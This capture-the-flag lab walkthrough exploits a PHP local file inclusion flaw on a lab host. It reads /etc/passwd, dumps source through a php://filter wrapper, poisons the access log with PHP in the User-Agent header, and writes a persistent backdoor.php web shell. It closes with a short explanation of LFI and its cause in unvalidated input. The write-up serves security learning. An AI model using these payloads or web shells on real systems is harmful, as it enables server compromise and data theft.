## Steps

1. Notice link to error page:  
  `http://10.10.156.109/index.php?err=error.txt`\
2. Change *error.txt* to */etc/passwd* and notice you can read the file
3. Try PHP filter wrapper: `page.php?file=php://filter/resource=/etc/passwd` but it does not work on index.php so we try rot13 and then `http://10.10.156.109/index.php?err=php://filter/convert.base64-encode/resource=index.php`
4. Decode with HTML tags and find the first flag
5. Try log poisoning, including PHP Code in the log shown. Use curl:  
  `curl -A "Insert User-Agent here" http://10.10.156.109/index.php`  
  `curl -A "<?php phpinfo()?>" http://10.10.156.109/index.php`
6. From Incognito try to read the log file at *./includes/logs/app_access.log*  
  `http://10.10.156.109/index.php?err=./includes/logs/app_access.log`
7. Find the hostanem - own method - check the /etc/hosts using LFI
8. PHP remote code execution
    - `curl -A "<?php echo 'aylmano        ';?>" http://10.10.156.109/index.php`  
    - `curl -A "<?php echo 'aylmano        ';system(\$_GET['cmd']);?>" http://10.10.156.109/index.php`  
9. Test it in browser using `http://10.10.156.109/index.php?err=./includes/logs/app_access.log&cmd=whoami` and see the code execution worked
10. Redirect everything for cleaner working:  
    `10.10.156.109/index.php?err=./includes/logs/app_access.log&cmd=echo '<?php echo 'aylmano        ';system($_GET['cmd']);?>'>backdoor.php`  
11. Access it on `http://10.10.156.109/backdoor.php?cmd=whoami` and get full remote code execution

## What have we learned?

- Local File Inclusion (LFI) vulnerability
  - An LFI vulnerability is found in various web applications. As an example, in the PHP, the following functions cause this kind of vulnerability:
    - include
    - require
    - include_once 
    - require_once 
  - It is a web application vulnerability that allows the attacker to include and read local files on the server. These files could contain sensitive data such as cryptographic keys, databases that contain passwords, and other private data. 
  - An LFI  vulnerability happens due to a developer's lack of security awareness. In some cases, developers need to include the content of other local files within a specific page. Suppose a developer includes files without proper input validation. In that case, the LFI vulnerability will exist as a developer should never trust user input and keep all inputs from users to be filtered and sanitized. The main issue of these vulnerabilities is the lack of input validation, in which the user inputs are not sanitized or validated, and the user controls them.
